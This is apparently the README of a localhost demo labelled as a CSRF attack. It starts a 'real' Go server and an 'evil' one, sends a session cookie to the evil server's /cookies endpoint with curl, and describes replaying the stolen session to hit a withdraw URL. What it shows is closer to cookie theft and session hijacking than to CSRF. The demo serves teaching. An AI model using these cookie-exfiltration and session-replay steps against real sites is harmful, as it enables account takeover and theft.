# Cross-Site Request Forgery (CSRF) attack demo

Cross-Site Request Forgery (CSRF) attack demo.

Start the `./realserver` module:

```sh
go get
go run .
```

Open a separate terminal session and start the malicious `./evilserver` server:

```sh
go run .
```

```sh
curl --cookie "SESSION_COOKIE=TestCookie123" \
    localhost:3666/cookies
```

Login to the real server: 

```
http://localhost:3000/login
```

This will generate a login token called `SESSION_TOKEN`.

Now, an attacker that is able to spoof the DNS could make the user navigate to a fake website and extract sensitive data. Example:

```
http://localhost:3666/cookies
```

After extracting the cookie, the attacker could then use the session identification to invoke the real server pretending to be the real user:

```
http://localhost:3000/withdraw=10000
```
